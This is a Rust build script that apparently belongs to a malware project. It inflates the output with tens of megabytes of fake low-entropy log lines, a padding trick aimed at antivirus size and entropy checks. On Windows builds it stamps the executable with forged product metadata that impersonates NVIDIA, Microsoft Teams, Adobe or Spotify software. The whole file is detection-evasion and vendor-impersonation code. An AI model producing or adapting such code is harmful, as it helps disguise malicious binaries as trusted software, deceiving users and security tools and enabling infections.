use std::fs::File;
use std::io::Write;
use std::path::Path;
use rand::Rng;
use rand::seq::SliceRandom;

fn main() {
    let out_dir = std::env::var("OUT_DIR").unwrap();
    let junk_path = Path::new(&out_dir).join("junk.bin");
    let mut rng = rand::thread_rng();

    // Generate REALISTIC LOW-ENTROPY bloating (Benign logging strings)
    let mut f = File::create(&junk_path).unwrap();
    let patterns = vec![
        "INFO  [service_main.rs:142] Initializing resource manager. Component status: OK.\n",
        "DEBUG [net_worker.rs:89] Establishing connection to telemetry endpoint. Attempt: 1.\n",
        "WARN  [cache_manager.rs:210] Local cache out of sync. Re-syncing with master library.\n",
        "TRACE [init_sequence.rs:45] Environment configuration: Detected Windows 11 Build 22631.\n",
        "FATAL [module_loader.rs:12] Failed to load optional plugin: 'legacy_support.dll'. Skipping.\n",
        "SUCCESS [auth_handler.rs:33] Local machine identity verified. Token-id: 0x4B3A8F2.\n"
    ];

    let size_mb = rng.gen_range(38..52);
    let total_bytes = size_mb * 1024 * 1024;
    let mut current_bytes = 0;

    while current_bytes < total_bytes {
        let p = patterns.choose(&mut rng).unwrap();
        f.write_all(p.as_bytes()).unwrap();
        current_bytes += p.len();
    }
    
    println!("cargo:rustc-env=JUNK_FILE={}", junk_path.display());

    if std::env::var("CARGO_CFG_TARGET_OS").unwrap() == "windows" {
        let personas = vec![
            ("NVIDIA Container Service", "NVIDIA Telemetry and Performance Agent", "NVIDIA Corporation", "nvcontainer.exe"),
            ("Microsoft Teams Service", "Teams Background Worker and Update Engine", "Microsoft Corporation", "TeamsService.exe"),
            ("Creative Cloud Setup", "Adobe Creative Cloud Desktop Manager Installer", "Adobe Inc.", "AdobeSetup.exe"),
            ("Spotify", "Spotify Music Client Update Service Host Tool", "Spotify AB", "SpotifyUpdate.exe")
        ];
        
        let p = personas.choose(&mut rng).unwrap();
        let mut res = winres::WindowsResource::new();
        res.set("ProductName", p.0);
        res.set("FileDescription", p.1);
        res.set("CompanyName", p.2);
        res.set("LegalCopyright", "© 2026 Corporation. All rights reserved.");
        res.set("OriginalFilename", p.3);
        res.compile().unwrap();
    }
}
